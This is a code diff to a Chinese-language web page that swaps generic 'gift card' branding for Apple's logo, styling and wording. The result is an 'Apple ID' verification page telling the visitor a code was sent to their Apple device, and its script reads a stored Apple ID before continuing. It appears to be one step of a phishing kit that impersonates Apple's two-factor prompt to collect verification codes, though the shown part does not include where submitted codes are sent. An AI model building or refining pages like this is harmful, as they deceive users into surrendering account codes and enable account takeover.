@@ -11,7 +11,7 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
     }
 
     body {
@@ -33,7 +33,7 @@
             }
           },
           boxShadow: {
-            'giftcard': '0 4px 14px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.1)',
+            'apple': '0 4px 14px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.1)',
           }
         }
       }
@@ -165,7 +165,7 @@
       background-color: #0071e3;
     }
   </style>
-  <title>验证 - 礼品卡ID</title>
+  <title>验证 - 苹果ID</title>
 </head>
 
 <body>
@@ -182,7 +182,7 @@
           <i class="fa fa-arrow-left"></i> 返回
         </button>
         <div class="flex items-center">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Giftcard_logo_black.svg/1200px-Giftcard_logo_black.svg.png" alt="礼品卡风格图标" class="h-8 w-auto mr-2">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/1200px-Apple_logo_black.svg.png" alt="苹果风格图标" class="h-8 w-auto mr-2">
           <span class="text-lg font-semibold">GiftCard</span>
         </div>
         <div class="w-6"></div> <!-- 占位，保持居中 -->
@@ -197,7 +197,7 @@
         <div class="text-center mb-8">
           <h1 class="text-2xl font-bold">验证您的身份</h1>
           <p class="text-secondary mt-2" id="verification-message">
-            验证码已发送至您的礼品卡设备
+            验证码已发送至您的苹果设备
           </p>
           <p class="text-sm text-secondary mt-1" id="device-name">
             iPhone
@@ -224,7 +224,7 @@
             <span id="resend-code" class="countdown">重新发送</span>
           </div>
           
-          <button type="submit" class="primary-btn w-full py-3 rounded-full hover:bg-primary/90 transition-colors shadow-giftcard text-lg font-medium">
+          <button type="submit" class="primary-btn w-full py-3 rounded-full hover:bg-primary/90 transition-colors shadow-apple text-lg font-medium">
             继续
           </button>
         </form>
@@ -243,11 +243,11 @@
 
   <script>
     // 从本地存储获取信息
-    const giftcardId = localStorage.getItem('giftcardId');
+    const appleId = localStorage.getItem('appleId');
     const verificationDevice = localStorage.getItem('verificationDevice');
     
     // 验证是否有登录信息，没有则返回登录页
-    if (!giftcardId || !verificationDevice) {
+    if (!appleId || !verificationDevice) {
       window.location.href = 'index.html';
     }
     
